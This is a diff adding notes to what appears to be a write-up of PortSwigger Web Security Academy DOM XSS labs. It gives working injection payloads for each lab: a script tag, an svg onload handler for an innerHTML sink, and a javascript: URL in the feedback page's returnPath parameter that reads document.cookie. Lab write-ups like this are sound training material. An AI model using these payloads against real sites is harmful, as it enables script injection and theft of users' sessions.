@@ -32,5 +32,30 @@ if(query) { trackSearch(query); }
 the solution:
 
 ```html
-"> <svg onload="alert(1)"></svg>
+">
+<script>
+  alert(1);
+</script>
+```
+
+# LAB: DOM XSS in innerHTML sink using source location.search
+
+in this lab search keyword are appeared in the html using .innerHTML instead of document.write so script tags will not work there another way which is svg tag with on laod property
+
+```html
+<svg onload="alert(1)"></svg>
+```
+
+# LAB: DOM XSS in jQuery anchor href attribute sink using location.search source
+
+here we have return link in the main url of send feedback page which is used for back button, in href tags we can inject js code like the following example
+
+```html
+<a href="javascript:{your_payload}">click me</a>
+```
+
+so the solution will be like that
+
+```
+https://0a84006604ccaa3c82516fab00d300f9.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
 ```
